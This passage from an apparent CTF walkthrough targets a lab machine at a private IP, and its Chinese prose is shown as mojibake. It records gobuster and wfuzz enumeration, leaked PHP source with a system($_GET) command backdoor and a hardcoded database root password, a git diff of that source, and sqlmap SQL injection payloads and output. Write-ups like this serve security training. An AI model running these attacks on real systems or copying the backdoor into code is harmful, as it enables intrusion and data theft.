class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.240.230</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">50</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              php,txt,html</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/home.php</span>             (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/login.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1466</span>]</span><br><span class="line"><span class="symbol">/history.php</span>          (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">31</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.php</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/about.php</span>            (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/index.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">3254</span>]</span><br><span class="line"><span class="symbol">/logout.php</span>           (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">0</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/control.php</span>          (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçš„historyæ˜¯é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºå†…å®¹çš„ï¼Œæ‰€ä»¥å¤§æ¦‚ç‡ç”¨è¿™ä¸ªè·¯å¾„<br>å…ˆå»å®‰è£…ä¸€ä¸‹seclistså­—å…¸ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# apt <span class="keyword">update</span></span><br><span class="line">Ge<span class="variable">t:1</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling InRelease [<span class="number">41.5</span> kB]</span><br><span class="line">Ge<span class="variable">t:2</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/main arm64 Packages [<span class="number">20.2</span> MB]</span><br><span class="line">Ge<span class="variable">t:3</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/main arm64 Contents (<span class="keyword">deb</span>) [<span class="number">47.9</span> MB]</span><br><span class="line">Ge<span class="variable">t:4</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/non-free arm64 Packages [<span class="number">148</span> kB]                                </span><br><span class="line">Ge<span class="variable">t:5</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/non-free arm64 Contents (<span class="keyword">deb</span>) [<span class="number">825</span> kB]                          </span><br><span class="line">Ge<span class="variable">t:6</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/contrib arm64 Packages [<span class="number">97.3</span> kB]                                </span><br><span class="line">Ge<span class="variable">t:7</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/contrib arm64 Contents (<span class="keyword">deb</span>) [<span class="number">179</span> kB]                           </span><br><span class="line">Fetched <span class="number">69.4</span> MB in <span class="number">13</span>s (<span class="number">5</span>,<span class="number">413</span> kB/s)                                                                               </span><br><span class="line"><span class="number">681</span> packages can <span class="keyword">be</span> upgraded. Run <span class="string">&#x27;apt list --upgradable&#x27;</span> <span class="keyword">to</span> see them.</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# apt install seclists</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç”¨wfuzzè¿›è¡Œæ¨¡ç³Šå‚æ•°å æ‰«å‡ºuser</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.240.230/history.php?FUZZ=kakeru -H &#x27;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&#x27; --hh 0</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.240.230/history.php?FUZZ=kakeru</span><br><span class="line">Total requests: 4734</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                           </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000004339:   200        0 L      5 W        85 Ch       &quot;user&quot;                                            </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 4734</span><br><span class="line">Filtered Requests: 4733</span><br><span class="line">Requests/sec.: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç”¨è¿™ä¸ªå‚æ•°æ±¡æŸ“æ¼æ´è®¿é—®adminçš„å†å²è®°å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://<span class="number">192.168</span>.<span class="number">240.230</span>/<span class="keyword">history</span>.php?user=admin -H <span class="string">&quot;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span></span><br><span class="line">Pages visited by user admin<span class="symbol">&lt;br&gt;</span><span class="symbol">&lt;br&gt;</span>https://github.<span class="keyword">com</span>/cyberbot75/keyring<span class="symbol">&lt;br&gt;</span><span class="symbol">&lt;br&gt;</span>    </span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure></div>
<p>æœ‰githubæºç æ³„æ¼<br>åœ¨control.phpä¸­å‘ç°æœ‰ä¸€ä¸ªæ³¨é‡Šï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;sqluserrootpassw0r4&quot;</span>;</span><br><span class="line">	<span class="variable">$database</span> = <span class="string">&quot;users&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$date</span> =  <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;insert into log (name , page_visited , date_time) values (&#x27;<span class="subst">$name</span>&#x27;,&#x27;control&#x27;,&#x27;<span class="subst">$date</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Date &amp; Time : &quot;</span>.<span class="variable">$date</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmdcntr&#x27;</span>]); <span class="comment">//system() function is not safe to use , dont&#x27; forget to remove it in production .</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å‘Šè¯‰æˆ‘ä»¬ä¼šæ‰§è¡Œcmdcntrè¿™ä¸ªå‚æ•°çš„å‘½ä»¤ï¼Œä»–æ²¡æœ‰åŠæ—¶åˆ é™¤<br>ä½†æ˜¯æˆ‘ç›´æ¥åœ¨urlåˆ©ç”¨å‘ç°å¹¶æ²¡æœ‰æ˜¾ç¤ºç»™æˆ‘<br><img src="https://pic1.imgdb.cn/item/67a4c6a0d0e0a243d4fc53d1.png"><br>è¿™é‡Œå¡ä½äº†ï¼Œçœ‹äº†è§†é¢‘çŸ¥é“ï¼Œè¿™ä¸ªå¿…é¡»æ˜¯ç®¡ç†å‘˜çš„è´¦æˆ·æ‰èƒ½ç”¨è¿™ä¸ªåé—¨<br>å‘ç°è¿‡ç¨‹ï¼šæŠŠæºç ä¸‹è½½ä¸‹æ¥ï¼Œç”¨git diffæ‰¾å‡ºä¸åŒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">(base) kakeru@bogon Downloads % git clone https:<span class="comment">//github.com/cyberbot75/keyring.git</span></span><br><span class="line">Cloning into <span class="string">&#x27;keyring&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: <span class="number">21</span>, done.</span><br><span class="line">remote: Counting objects: <span class="number">100</span>% (<span class="number">21</span>/<span class="number">21</span>), done.</span><br><span class="line">remote: Compressing objects: <span class="number">100</span>% (<span class="number">17</span>/<span class="number">17</span>), done.</span><br><span class="line">remote: Total <span class="number">21</span> (delta <span class="number">9</span>), reused <span class="number">0</span> (delta <span class="number">0</span>), pack-reused <span class="number">0</span> (from <span class="number">0</span>)</span><br><span class="line">Receiving objects: <span class="number">100</span>% (<span class="number">21</span>/<span class="number">21</span>), <span class="number">6.26</span> KiB | <span class="number">3.13</span> MiB/s, done.</span><br><span class="line">Resolving deltas: <span class="number">100</span>% (<span class="number">9</span>/<span class="number">9</span>), done.</span><br><span class="line">(base) kakeru@bogon Downloads % cd keyring </span><br><span class="line">(base) kakeru@bogon keyring % git <span class="keyword">log</span></span><br><span class="line">commit <span class="number">9215</span>fbd50358462a5868c04bfe93ea549c101a2b (HEAD -&gt; main, origin/main, origin/HEAD)</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Mon Jun <span class="number">21</span> <span class="number">19</span>:<span class="number">07</span>:<span class="number">49</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit d63d664e940253192aa05f4b5afe46204452f574</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Mon Jun <span class="number">21</span> <span class="number">18</span>:<span class="number">33</span>:<span class="number">18</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit <span class="number">460</span>cb9f1bf00701403393d4546797eee17121700</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Thu Jun <span class="number">10</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">41</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit <span class="number">1</span>a772923c80cb07d621d6e654a4e78819126e0a9</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Thu Jun <span class="number">10</span> <span class="number">18</span>:<span class="number">55</span>:<span class="number">32</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Add files via upload</span><br><span class="line">(base) kakeru@bogon keyring % git diff <span class="number">9215</span>fbd50358462a5868c04bfe93ea549c101a2b <span class="number">460</span>cb9f1bf00701403393d4546797eee17121700</span><br><span class="line">diff --git a/html/<span class="keyword">control</span>.php b/html/<span class="keyword">control</span>.php</span><br><span class="line">index <span class="number">3</span>bb3250.<span class="number">.823</span>b4c5 <span class="number">100644</span></span><br><span class="line">--- a/html/<span class="keyword">control</span>.php</span><br><span class="line">+++ b/html/<span class="keyword">control</span>.php</span><br><span class="line">@@ <span class="number">-1</span>,<span class="number">5</span> +<span class="number">1</span>,<span class="number">3</span> @@</span><br><span class="line">-Code <span class="keyword">for</span> staging server</span><br><span class="line">-</span><br><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">@@ <span class="number">-53</span>,<span class="number">7</span> +<span class="number">51</span>,<span class="number">10</span> @@ <span class="keyword">if</span>(isset($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">        $conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">        $name = $_SESSION[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $date =  <span class="keyword">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">-       echo <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">+</span><br><span class="line">+       <span class="keyword">if</span>($name===<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">+       &#123;</span><br><span class="line">+               echo <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">                $sql = <span class="string">&quot;insert into log (name , page_visited , date_time) values (&#x27;$name&#x27;,&#x27;control&#x27;,&#x27;$date&#x27;)&quot;</span>;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span>(mysqli_query($conn,$sql))</span><br><span class="line">@@ <span class="number">-61</span>,<span class="number">7</span> +<span class="number">62</span>,<span class="number">12</span> @@ <span class="keyword">if</span>(isset($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">                                echo <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                                echo <span class="string">&quot;Date &amp; Time : &quot;</span>.$date;</span><br><span class="line">                        &#125;</span><br><span class="line">-               <span class="keyword">system</span>($_GET[<span class="string">&#x27;cmdcntr&#x27;</span>]); <span class="comment">//system() function is not safe to use , dont&#x27; forget to remove it in production .</span></span><br><span class="line">+               <span class="keyword">system</span>($_GET[<span class="string">&#x27;timer&#x27;</span>]); <span class="comment">//system() is not safe to use , dont&#x27; forget to remove it  in latest release .</span></span><br><span class="line">+       &#125;</span><br><span class="line">:</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å…ˆç”¨sqlmapè¿›è¡Œæ³¨å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.8.12#stable&#125;</span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility <span class="keyword">to</span> obey all applicable local, state <span class="keyword">and</span> federal laws. Developers assume <span class="literal">no</span> liability <span class="keyword">and</span> are <span class="keyword">not</span> responsible <span class="keyword">for</span> any misuse <span class="keyword">or</span> damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:54:45 /2025-02-06/</span><br><span class="line"></span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing<span class="built_in"> connection </span><span class="keyword">to</span> the target URL</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] checking <span class="keyword">if</span> the target is protected by some kind of WAF/IPS</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] target URL content is stable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">if</span> <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is dynamic</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> appears <span class="keyword">to</span> be dynamic</span><br><span class="line">[20:54:45] [<span class="built_in">WARNING</span>] heuristic (basic) test shows that <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> might <span class="keyword">not</span> be injectable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">for</span> SQL injection on <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span></span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">WARNING</span>] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> appears <span class="keyword">to</span> be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable </span><br><span class="line">it looks like the back-end DBMS is <span class="string">&#x27;MySQL&#x27;</span>. <span class="keyword">Do</span> you want <span class="keyword">to</span> skip test payloads specific <span class="keyword">for</span> other DBMSes? [Y/n] Y</span><br><span class="line"><span class="keyword">for</span> the remaining tests, <span class="keyword">do</span> you want <span class="keyword">to</span> include all tests <span class="keyword">for</span> <span class="string">&#x27;MySQL&#x27;</span> extending provided level (1) <span class="keyword">and</span> risk (1) values? [Y/n] Y</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] automatically extending ranges <span class="keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] target URL appears <span class="keyword">to</span> be UNION injectable with 1 columns</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span> injectable</span><br><span class="line"><span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is vulnerable. <span class="keyword">Do</span> you want <span class="keyword">to</span> keep testing the others (<span class="keyword">if</span> any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter:<span class="built_in"> user </span>(GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="attribute">user</span>=kakeru&#x27; <span class="keyword">AND</span> (SELECT 9710 <span class="keyword">FROM</span> (SELECT(SLEEP(5)))Gxfh) <span class="keyword">AND</span> <span class="string">&#x27;flol&#x27;</span>=<span class="string">&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27;</span> UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span><br><span class="line">---</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">web<span class="built_in"> server </span>operating system: Linux Ubuntu 18.04 (bionic)</span><br><span class="line">web application technology: Apache 2.4.29</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] fetching database names</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line">[*]<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] fetched data logged <span class="keyword">to</span> text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 20:54:56 /2025-02-06/</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch -D<span class="built_in"> users </span>--tables</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.8.12#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&quot;</span>]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility <span class="keyword">to</span> obey all applicable local, state <span class="keyword">and</span> federal laws. Developers assume <span class="literal">no</span> liability <span class="keyword">and</span> are <span class="keyword">not</span> responsible <span class="keyword">for</span> any misuse <span class="keyword">or</span> damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:55:57 /2025-02-06/</span><br><span class="line"></span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] testing<span class="built_in"> connection </span><span 